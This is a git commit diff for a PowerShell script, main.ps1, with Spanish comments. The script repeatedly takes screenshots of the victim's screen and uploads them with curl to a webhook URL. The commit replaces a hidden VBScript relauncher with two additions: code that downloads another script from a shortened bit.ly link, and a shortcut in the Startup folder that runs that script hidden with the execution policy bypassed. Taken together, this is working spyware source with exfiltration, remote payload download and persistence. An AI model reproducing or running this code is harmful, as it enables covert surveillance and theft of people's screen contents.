0af7fc9a83b0b188887dfb62937f48c6c8da7c87
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-11 09:21:22 -0500

    Actualizar main.ps1

--- main.ps1
+++ main.ps1
@@ -4,50 +4,38 @@ $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
 if ($hookurl.Length -ne 121) {
-    Write-Host "Shortened Webhook URL Detected000..."
+    Write-Host "Shortened Webhook URL Detected..."
     $hookurl = (irm $hookurl).url
 }
 
-# Obtener la ruta del directorio donde se encuentra este script
-$scriptDirectory = $PSScriptRoot
-if (-not $scriptDirectory) {
-    $scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Definition
-}
-
-# Verificar si la ruta del directorio está definida
-if (-not $scriptDirectory) {
-    Write-Host "No se puede determinar la ruta del directorio del script."
-    exit
-}
-
-# Obtener la ruta del archivo de VBScript
-$vbsScriptPath = Join-Path -Path $scriptDirectory -ChildPath "RunHidden.vbs"
-
-# Crear el archivo VBScript si no existe
-if (-not (Test-Path $vbsScriptPath)) {
-@"
-Set WshShell = CreateObject(""WScript.Shell"")
-WshShell.Run ""powershell.exe -ExecutionPolicy Bypass -File '$($MyInvocation.MyCommand.ScriptFullName)' "", 0, false
-"@ | Set-Content -Path $vbsScriptPath -Encoding ASCII
-}
-
 do {
-    $Filett = Join-Path -Path $env:temp -ChildPath "SC.png"
+    $Filett = "$env:temp\SC.png"
+    
     # Verificar si el archivo ya existe antes de crear uno nuevo
     if (-not (Test-Path $Filett)) {
         Add-Type -AssemblyName System.Windows.Forms
         Add-type -AssemblyName System.Drawing
-        $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-        $Width = $Screen.Width
-        $Height = $Screen.Height
-        $Left = $Screen.Left
-        $Top = $Screen.Top
-        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
         $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+        $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
         $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
     }
+    
     Start-Sleep 1
+    
+    # Verificar si la variable $hookurl está definida antes de utilizarla
+    if (-not $hookurl) {
+        Write-Host "La variable hookurl no está definida."
+        exit
+    }
+
+    # Verificar si la variable $Filett está definida antes de utilizarla
+    if (-not $Filett) {
+        Write-Host "La variable Filett no está definida."
+        exit
+    }
+
     curl.exe -F "file1=@$Filett" $hookurl
     Start-Sleep 1
     Remove-Item -Path $Filett
@@ -55,9 +43,19 @@ do {
 
     # Verificar si se ha alcanzado la cantidad máxima de imágenes
     if ($a -eq $maxImages) {
-        # Ejecutar el archivo de VBScript
-        Start-Process wscript.exe -ArgumentList $vbsScriptPath
-
+        # Descargar el script principal
+        $syswUrl = "https://bit.ly/Screen_dc"
+        $syswPath = "$env:USERPROFILE\sysw.ps1"
+        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
+        
+        # Crear acceso directo en la carpeta de inicio del usuario
+        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
+        $shell = New-Object -ComObject WScript.Shell
+        $shortcut = $shell.CreateShortcut($shortcutLocation)
+        $shortcut.TargetPath = "powershell.exe"
+        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
+        $shortcut.Save()
+        
         # Reiniciar contador de imágenes
         $a = 0
     }
